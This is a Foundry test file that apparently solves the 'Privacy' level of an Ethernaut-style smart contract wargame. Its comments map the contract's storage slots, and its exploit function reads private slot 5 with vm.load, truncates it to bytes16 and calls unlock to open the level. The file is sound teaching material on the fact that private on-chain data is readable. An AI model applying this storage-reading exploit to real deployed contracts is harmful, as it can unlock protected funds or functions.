// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Privacy.sol";
import "src/levels/PrivacyFactory.sol";

contract TestPrivacy is BaseTest {
    Privacy private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PrivacyFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        // each slot takes up to 32bytes or 256bits.
            // bool public locked = true;                   -- slot 0
            // uint256 public ID = block.timestamp;         -- slot 1, it can not fit in what remained in slot0
            // uint8 private flattening = 10;               -- slot 2
            // uint8 private denomination = 255;            -- slot 2
            // uint16 private awkwardness = uint16(now);    -- slot 2
            // bytes32[3] private data;                     -- this is fixed sized defined array and values are stored in next 3 slots. slot 3, slot 4, slot 5

        // we need data of third array element which is in slot 5. 
        super.setUp();

        levelAddress = payable(this.createLevelInstance(true));
        level = Privacy(levelAddress);

         assertEq(level.locked(), true);
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        level = Privacy(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        // we just need to read 3 element of array and cast it to bytes16. 
        // 
        bytes32 key32 = vm.load(address(level), bytes32(uint256(5)));
        bytes16 key16 = bytes16(key32);
        level.unlock(key16);

        assertEq(level.locked(), false);


        vm.stopPrank();
    }
}

contract Exploiter {
    
}